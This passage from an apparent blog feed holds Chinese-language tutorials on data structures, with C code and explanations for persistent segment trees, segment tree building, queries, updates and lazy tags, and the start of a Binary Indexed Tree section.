class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> pre, <span class="keyword">int</span>&amp; now, <span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> v, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    now = ++tot;</span><br><span class="line">    sum[now] = sum[pre] + type;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span>;</span><br><span class="line">    lson[now] = lson[pre];</span><br><span class="line">    rson[now] = rson[pre];</span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    <span class="keyword">if</span> (v &lt;= mid) update(lson[pre], lson[now], l, mid, v, type);</span><br><span class="line">    <span class="keyword">else</span> update(rson[pre], rson[now], mid+<span class="number">1</span>, r, v, type);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// type为1加上，-1表示减去</span></span><br><span class="line"><span class="comment">// x表示的是在原数组a中的下标，使用lower_bound得到其在离散化后的数组的位置</span></span><br><span class="line"><span class="comment">// 注意到使用树状数组，每次更新点x的时候，还要更新x+lowbit(x)的主席树</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> type)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pos = lower_bound(b+<span class="number">1</span>, b+m+<span class="number">1</span>, a[x]) - b;</span><br><span class="line">    <span class="keyword">while</span> (x &lt;= n) &#123;</span><br><span class="line">        update(rt[x], rt[x], <span class="number">1</span>, m, pos, type);</span><br><span class="line">        x += lowbit(x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 同样的，由于使用树状数组，这里需要加上(减去)所有沿着树状数组路径上的主席树</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (l == r) <span class="keyword">return</span> l;</span><br><span class="line">    <span class="keyword">int</span> x = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tl; i++) x -= sum[lson[ql[i]]];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tr; i++) x += sum[lson[qr[i]]];</span><br><span class="line">    <span class="keyword">int</span> mid = mid(l,r);</span><br><span class="line">    <span class="keyword">if</span> (k &lt;= x) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tl; i++) ql[i] = lson[ql[i]];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tr; i++) qr[i] = lson[qr[i]];</span><br><span class="line">        <span class="keyword">return</span> query(l, mid, k);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tl; i++) ql[i] = rson[ql[i]];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= tr; i++) qr[i] = rson[qr[i]];</span><br><span class="line">        <span class="keyword">return</span> query(mid+<span class="number">1</span>, r, k - x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 如果需要整个题目的代码的话，也可以联系我哈(其实网上好多题解的)</span></span><br></pre></td></tr></table></figure></p><p>　　这种写法的话，时间和空间上复杂度均为O(nlog<sup>2</sup>n)，开销是很大的。但貌似没有什么更好的办法了。(如果有还请告诉我)</p><h2 id="last-but-not-least"><a href="#last-but-not-least" class="headerlink" title="last but not least"></a>last but not least</h2><p>　　重新回到我们的主题上面来，我们一开始提的问题是，求解一个区间上的第K大值的问题，当然，上面讨论的使用主席树的写法其实主要是用于多次询问，如果只有一次询问的话，很显然我们完全没必要这么麻烦。我们可以直接使用sort，然后输出第k个数即可。我们也可以使用选择排序，第k个选择的数就是第k大。我们甚至可以使用哈希进行计数排序。貌似也可以使用堆排序进行处理。当然，还有一种使用基于快速排序思想的求第k大的算法。<br>　　这里想说的其实是，对于一道同样的问题，它的解法有可能是多样化的，并且，对于不同的数据规模，可能也有不同的优秀算法，因此，最好不要拘泥于某一中特定的算法(当然，解法唯一的题目还是有的吧)。<br>　　(包括很多看起来很难的题目，由于数据比较水，暴力还是可以拿到很多分的，甚至AC</p><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　数据结构大杂烩系列的第二篇文章在这里就告一段落了(其实这篇文章严格意义上来说应该算是第一篇文章的补充)。同样的，我们一开始引入一个区间第k大的问题，然后，顺着这个话题，讲到了权值线段树的一些概念，一步一步推出主席树建立的思想过程，接着，再通过一道模板题，简单地提了一下主席树的写法。再接着，我们又将题目难度升级，尝试着求解树上的第k大问题，再后面，我们又提到了带单点修改的主席树的写法(其实严格意义上说这个应该算是树套树)。最后，我们再一次地回到了主题，关于求解区间的第k大的问题。当然，如果要理解清楚的话，还是只能自己去做几道题，这里目的仅仅是提一下主席树的思想而已。<br>　　下一篇文章的话可能要比较久后才出来，也有可能写算法相关的一些博客，敬请期待吧。(在做了.jpg</p>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> persistent segment tree </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(I) —— Segment Tree</title>
      <link href="/2019/05/14/data-structure1/"/>
      <url>/2019/05/14/data-structure1/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是数据结构大杂烩系列的第一篇文章。这个系列主要将记录自己在学习数据结构方面的一些笔记等，以加深自己对数据结构的认识。(不知道能不能坚持做下去<br>　　在维基百科中，是这样介绍数据结构的：</p><blockquote><p>In computer science, a data structure is a data organization, management, and storage format that enables efficient access and modification. More precisely, a data structure is a collection of data values, the relationships among them, and the functions or operations that can be applied to the data.</p></blockquote><p>　　数据结构作为计算机中一个不可分割的重要组成部分，应用十分广泛，几乎在绝大多数的代码中我们都能见到它的身影——链表，栈，队列，树等等。下面就让我们一起来学习一些基础的数据结构吧！<br>　　今天的主题是segment tree，也就是线段树！</p><h2 id="a-simple-problem"><a href="#a-simple-problem" class="headerlink" title="a simple problem"></a>a simple problem</h2><p>　　在正式学习线段树相关的问题之前，我们先来考虑以下一个问题。</p><blockquote><p>给定一个数组n，然后有m个询问，每个询问包含两个值L和R，我们需要求出在区间[L，R]内所有的元素的和(乘积)。</p></blockquote><p>　　最直接的，我们知道，可以直接起手一个for循环，直接遍历累加即可。好吧，那么这个时候如果n的大小为200000，且有m个询问，复杂度可是O(nm)了，这样的复杂度还能接受吗？作为一个软件工程师，我们当然是不能接受的。那么怎么办呢？<br>　　这时候你可能要认为，那就用线段树吧，今天的主题。但是，我拒绝！<br>　　就这个问题来说，我们不需要使用什么数据结构，只需要开一个新的sum数组，对前缀和做一个累加(累乘，不考虑溢出)，然后，我们只需要用sum[R]-sum[L-1]即可得到区间[L,R]的累加值了。<br>　　这个时候，又来了一个问题，现在我需要修改某一个点x了，这该怎么办呢？直接更新sum[1]~sum[x-1]显然是不行的，这样的效率也太低了，这种方法就做不下去了。这样，我们就引入了一种新的数据结构，叫线段树。</p><h2 id="what-is-a-segment-tree"><a href="#what-is-a-segment-tree" class="headerlink" title="what is a segment tree"></a>what is a segment tree</h2><p>　　从名字我们其实就可以猜到它是干什么的。线段树首先是一颗树，而且还是一棵完全二叉树(此处不予证明)。并且，每一个叶子结点的值包含着某一个线段(区间)的一些信息。这就是线段树。这么说可能还有点难以理解，下面我们以一个长度为7的数组[3,4,1,6,7,5,2]为例子，来看下一颗线段树长什么样子。<br><img src="/2019/05/14/data-structure1/segment_tree1.jpg" alt="segment_tree1"><br>　　这就是一颗简单的线段树。每个节点包含的区间长度大于1时，则会分裂出子节点，直到长度为1。其中，左儿子为包含的为左半区间，右儿子包含的为右半区间，并且，同一层之间所有节点包含的区间的并集为恰好为整个区间(满二叉树下)，且各节点包含的区间之间没有任何重叠。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seg_node</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> l, r;  <span class="comment">// 该节点包含的区间为区间[l,r]</span></span><br><span class="line">  <span class="keyword">int</span> sum; <span class="comment">// 区间的和</span></span><br><span class="line">  <span class="keyword">int</span> maxn, minn; <span class="comment">// 区间的最大值和最小值</span></span><br><span class="line">  ...</span><br><span class="line">&#125; tree[N];</span><br></pre></td></tr></table></figure><h2 id="how-to-build-a-segment-tree"><a href="#how-to-build-a-segment-tree" class="headerlink" title="how to build a segment tree"></a>how to build a segment tree</h2><p>　　构建一颗线段树的话，简单来说就两个字，二分！对于每一个区间[L,R]，当R！=L时，就分裂出子节点，分界为mid。这样，我们就得到了一颗用于求区间和的二叉树。注意到线段树的特性使得对下标为n的节点，左儿子的下标为2n，右儿子的下标为2n+1<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> lson(d) (d&lt;&lt;1)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rson(d) (d&lt;&lt;1|1)</span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">8</span>] = [<span class="number">0</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">5</span>,<span class="number">2</span>]; <span class="comment">// 数组下标是从0开始的，这里为了方便补一个0</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> l, <span class="keyword">int</span> r)</span> </span>&#123;</span><br><span class="line">  tree[d].l = l;</span><br><span class="line">  tree[d].r = r;</span><br><span class="line">  <span class="keyword">if</span> (l == r) &#123; <span class="comment">// 叶子节点时结束递归。并且赋值</span></span><br><span class="line">    tree[d].sum = a[l];</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  build(lson(d),l,mid);</span><br><span class="line">  build(rson(d),mid+<span class="number">1</span>,r);</span><br><span class="line">  tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum; <span class="comment">// 别忘了递归完后要进行值的合并</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="segment-tree’s-operation"><a href="#segment-tree’s-operation" class="headerlink" title="segment tree’s operation"></a>segment tree’s operation</h2><h3 id="search-one-leaf"><a href="#search-one-leaf" class="headerlink" title="search one leaf"></a>search one leaf</h3><p>　　如果我们需要查找某一个节点,我们可以这样来写(其实就是一个二分查找)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">search</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">  <span class="keyword">if</span> (l == r) <span class="keyword">return</span> tree[d].x;</span><br><span class="line">  <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (x &lt;= mid) <span class="keyword">return</span> search(lson(d),x);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> search(rson(d),x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　看到这里，我想也许你会有一个疑问，这样写的话，查找单个点的复杂度不就变成了O(logn)了吗？这效率不是变低了吗？是的，查找一个点的话，效率确实变低了。然而，线段树最大的优势在于区间上！</p><h3 id="query"><a href="#query" class="headerlink" title="query"></a>query</h3><p>　　接下来这里就是重头戏了，在查找一个区间的时候，我们这样来写：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查询[L,R]区间和</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">  <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) &#123;</span><br><span class="line">    <span class="keyword">return</span> tree[d].sum; <span class="comment">// 当所查找的区间完全覆盖当前节点时，直接返回！</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> (L &lt;= mid) ans += query(lson(d),L,R);  <span class="comment">// 查找的区间覆盖到左区间时，往左找</span></span><br><span class="line">  <span class="keyword">if</span> (R &gt; mid) ans += query(rson(d),L,R);  <span class="comment">// 查找的区间覆盖到右区间时，往右找</span></span><br><span class="line">  <span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　下面还是以那个数组为例，看一下查找区间[3,5]的时候会发生些什么(红色的线为查询过程中经过的路径)。<br><img src="/2019/05/14/data-structure1/segment_tree2.jpg" alt="segment_tree2"><br>　　同样的，区间查找也可以用于维护区间的乘积以及最大值和最小值。<br>　　可以证明，线段树的区间查询复杂度为O(logn)，简单的证明如下：</p><ol><li>由前面我们知道，含n个元素的线段树最多为logn+1层。目标证明每一层需要考察的节点数不会超过4个。</li><li>假设现在在[l,r]区间内查询[L,R]。在当前层内，考察的节点数为2(左右儿子)。当[L,R]仅覆盖左子区间或右子区间时，递归进入对应区间，下一层考察的节点数仍为2，回到证明2。当同时覆盖左子区间和右子区间时，下一层考察的节点数为4，进入证明3。</li><li>将左子区间的左右儿子记为左1和左2，右子区间的左右儿子记为右1和右2。由于区间的连续性和不相交性，查询区间必定覆盖左2和右1，若该区间没有覆盖左1和右2，则下一层需要考察的节点仍然为4个。若区间覆盖了左1，则必然覆盖了左2整个区间，左2不再递归；若区间覆盖了右2，则必然覆盖了右1整个区间，右1不再递归，则下一层需要考察的节点仍然不超过4个。</li></ol><p>　　另外一种大致的证明思路是，把当前查询区间[L,R]分为n个子区间，且每一个子区间的长度都是2的整数次幂，即N = 2<sup>k<sub>0</sub></sup>+2<sup>k<sub>1</sub></sup>+…+2<sup>k<sub>n</sub></sup>。且不存在连续的3个k的值相同(若存在，由区间的连续性，则有其中的两个k可以并成一个更大k，矛盾)，故n&lt;=2logN。并且，k的值只能先减小后增大，不会出现两次减小的情况。此时，可以得到每一层需要获取sum的节点数必为常数，最后的时间复杂度级别仍然为O(logn)。</p><h3 id="change-one-leaf"><a href="#change-one-leaf" class="headerlink" title="change one leaf"></a>change one leaf</h3><p>　　尽管前面我们已经能够求得在logn的复杂度情况下求得区间和了，但如果需要修改的话，线段树做的到吗？答案显而易见。当要更改某一个节点时，只需要按照逐层深入，修改某个节点即可,记得修改完后更新父亲节点的值即可。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> pos, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">  <span class="keyword">if</span> (l == r) &#123;</span><br><span class="line">    tree[d].sum = v;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> (pos &lt;= mid) update(lson(d), pos, v);</span><br><span class="line">  <span class="keyword">else</span> update(rson(d), pos, v);</span><br><span class="line">  tree[d].sum = tree[lson(d)].sum + tree[rson(d)].sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="lazy-tag"><a href="#lazy-tag" class="headerlink" title="lazy tag"></a>lazy tag</h3><p>　　既然前面我们考虑到了改变某个节点，现在如果要更新某个区间呢？线段树又该怎么处理呢？<br>　　最直接的办法就是逐点更新，这样的处理明显是不行的，但是如果要一次性更新那么多个节点，别说复杂度高达O(mn)，栈也很有可能会爆掉。那么我们有什么好办法呢？<br>　　注意到一个细节，我们是不是可以不用更新那么多个节点呢？如果只更新少量节点的话，复杂度就可以下降了吧？比如现在在维护一个区间和，然后当前区间为[3,4]，要更新的区间为[2,4]，那么我们是不是可以只要更新节点[3,4]就行了，它的子节点暂时不去管，这样，如果需要查询区间[3,4]，我们也能给出正确的答案，只有当需要请求到[3,3]节点的时候我们再去更新它。如下图：<br><img src="/2019/05/14/data-structure1/segment_tree3.jpg" alt="segment_tree3"><br>　　核心代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">segment_tree</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> v, tag; <span class="comment">// tag为惰性标记，v为区间和</span></span><br><span class="line">&#125; tree[N];</span><br><span class="line"><span class="comment">/* pushdown为线段树的关键操作，作用是将惰性标记从父节点传递到子节点。注意一下，当打上标记tag的时候，</span></span><br><span class="line"><span class="comment">说明当前节点的更新已经完成，但是子节点的值还没有更新。传递的时候就更新子节点，</span></span><br><span class="line"><span class="comment">然后子节点打上标记(子节点的子节点待更新)，并且把当前节点的标记清零，说明子节点的更新已经完成。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pushdown</span><span class="params">(<span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">    <span class="keyword">int</span> tag = tree[d].tag, mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    tree[d].tag = <span class="number">0</span>;</span><br><span class="line">    tree[lson(d)].v += (mid - l + <span class="number">1</span>) * tag;</span><br><span class="line">    tree[rson(d)].v += (r - mid) * tag;</span><br><span class="line">    tree[lson(d)].tag += tag;</span><br><span class="line">    tree[rson(d)].tag += tag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> L, <span class="keyword">int</span> R, <span class="keyword">int</span> v)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">    <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) &#123;</span><br><span class="line">        tree[d].tag += v;</span><br><span class="line">        tree[d].v += (<span class="keyword">long</span> <span class="keyword">long</span>) v * (r - l + <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree[d].tag) pushdown(d);  <span class="comment">// 注意，这行代码不能漏掉，否则会导致当前节点得到的值不是真实值</span></span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (L &lt;= mid) update(lson(d), L, R, v);</span><br><span class="line">    <span class="keyword">if</span> (R &gt; mid) update(rson(d), L, R, v);</span><br><span class="line">    tree[d].v = tree[lson(d)].v + tree[rson(d)].v;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="keyword">long</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> d, <span class="keyword">int</span> L, <span class="keyword">int</span> R)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">    <span class="keyword">if</span> (L &lt;= l &amp;&amp; r &lt;= R) <span class="keyword">return</span> tree[d].v;</span><br><span class="line">    <span class="keyword">if</span> (tree[d].tag) pushdown(d); <span class="comment">// 注意，当想要查询子区间时，需要先进行更新！</span></span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (R &lt;= mid) <span class="keyword">return</span> query(lson(d), L, R);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (L &gt; mid) <span class="keyword">return</span> query(rson(d), L, R);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">return</span> query(lson(d), L, R) + query(rson(d), L, R);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　线段树一个比较大的难点就在于惰性标记的设置上，一不小心很容易犯错，且通常情况下这种错误很难肉眼直接看出来(笔者就曾经因为惰性标记卡了好久)。这个还是建议做一下题，基本上就可以很好地掌握了。推荐codevs上面的<a href="http://codevs.cn/problem/?q=%E7%BA%BF%E6%AE%B5%E6%A0%91" target="_blank" rel="noopener">线段树系列</a>。</p><h3 id="double-lazy-tag"><a href="#double-lazy-tag" class="headerlink" title="double lazy tag"></a>double lazy tag</h3><p>　　好了，如果到这里你都能看懂的话，现在难度又要提高了。如果我们的区间更新中，既包括加法，又包括乘法，那该怎么办呢？这样的话，上面的lazy tag做法似乎就存在一些问题了。<br>　　一个可行的解法是，如果一个lazy tag不行，那就来两个！这样貌似没什么问题，可细细想想，问题老多了。首先，如果有两个tag，一个表示加法，一个表示乘法，那么在传递的时候，我们应该先将哪一个传递下去呢？比如这个时候如果我们对整个区间做了一个加法，又做了一个乘法，再做了一个加法，那这样的话不久乱套了吗？<br>　　为了顺利解决不同的tag之间的冲突，我们必须为tag定一个先后顺序。<br>　　让我们先来考虑这样的情况。假设当前区间的和为x，共n个元素，现在依次做一个区间加法a，一个区间乘法b，再来一个区间加法c。<br>　　如果我们先把加法传递下去。那么第一步打上加法标记a，接下来做区间乘法，打上乘法标记b，再做区间加法，加法标记变为a+c。这个时候进行一次pushdown操作，由于加法优先，子节点(和为x,元素数量为n)从x变为b(x+(a+c)*n)，显然是不对的。如果要使最后的答案变得正确，我们需要把c修正为c/b。这就带来了很多麻烦了。<br>　　如果我们先把乘法传递下去。一开始打上加法标记a，后面在打上乘法标记b的时候，把加法标记变成ab，最后加上c的时候，加法标记变为ab+c(注意到b*(x+a)+c = bx+ab+c)。<b>即我们需要做的，就是在处理区间做乘法的时候，同时对加法标记做一次乘法，在处理区间做加法的时候，只需要更新加法标记即可。</b>核心代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seg_tree</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> l, r;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> v, add_tag, mul_tag;</span><br><span class="line">&#125; tree[N];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pushdown</span><span class="params">(<span class="keyword">int</span> d)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> l = tree[d].l, r = tree[d].r;</span><br><span class="line">    <span class="keyword">int</span> lson = lson(d), rson = rson(d);</span><br><span class="line">    <span class="keyword">int</span> mid = (l+r)&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (tree[d].mul_tag != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> v = tree[d].mul_tag;</span><br><span class="line">        <span class="comment">// 下面取模是题目需要，如果题目保证不溢出，则可省去</span></span><br><span class="line">        tree[lson].add_tag = (tree[lson].add_tag * v) % mod;</span><br><span class="line">        tree[rson].add_tag = (tree[rson].add_tag * v) % mod;</span><br><span class="line">        tree[lson].mul_tag = (tree[lson].mul_tag * v) % mod;</span><br><span class="line">        tree[rson].mul_tag = (tree[rson].mul_tag * v) % mod;</span><br><span class="line">        tree[lson].v = (tree[lson].v * v) % mod;</span><br><span class="line">        tree[rson].v = (tree[rson].v * v) % mod;</span><br><span class="line">        tree[d].mul_tag = <span class="number">1</span>; <span class="comment">// 注意到乘法标记的初始值应该为1，即乘法运算的单位元</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tree[d].add_tag) &#123;</span><br><span class="line">        <span class="keyword">long</span> <span class="keyword">long</span> v = tree[d].add_tag;</span><br><span class="line">        tree[lson].add_tag = (tree[lson].add_tag + v) % mod;</span><br><span class="line">        tree[rson].add_tag = (tree[rson].add_tag + v) % mod;</span><br><span class="line">        tree[lson].v = ((mid - l + <span class="number">1</span>) * v + tree[lson].v) % mod;</span><br><span class="line">        tree[rson].v = ((r - mid) * v + tree[rson].v) % mod;</span><br><span class="line">        tree[d].add_tag = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　当然，如果现在题目不是要求同时做加法和乘法，而是进行set操作(将区间所有值变为一个确定的值，见codevs的线段树练习题)，那么我们的策略也要进行对应的更改，这里不再赘述。另外，说一个题外话，如果有三个或以上的区间操作呢？大体的思路还是一样的，即在保证各个tag不相互冲突的前提下将tag传递到子节点即可。相信聪明的你一定能找到对应的解决办法的。</p><h2 id="Binary-Indexed-Tree"><a href="#Binary-Indexed-Tree" class="headerlink" title="Binary Indexed Tree"></a>Binary Indexed Tree</h2><p>　　前面我们谈到了用线段树去实现区间的修改和查询。但是除去线段树的话，还有没有什么比较好的办法呢？答案肯定是有的，它的名字叫做树状数组。不过，与其说是树状数组，它的英文名字更能体现出它的思想。树状数组的每一个位置存放的是一个区间的值，而不是一个点，其直观表现图如下：<br><img src="/2019/05/14/data-structure1/binary_indexed_tree.jpg" alt="binary_indexed_tree"></p><h3 id="prepare"><a href="#prepare" class="headerlink" title="prepare"></a>prepare</h3><p>　　要实现树状数组，首先，必须要理解lowbit函数，具体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span 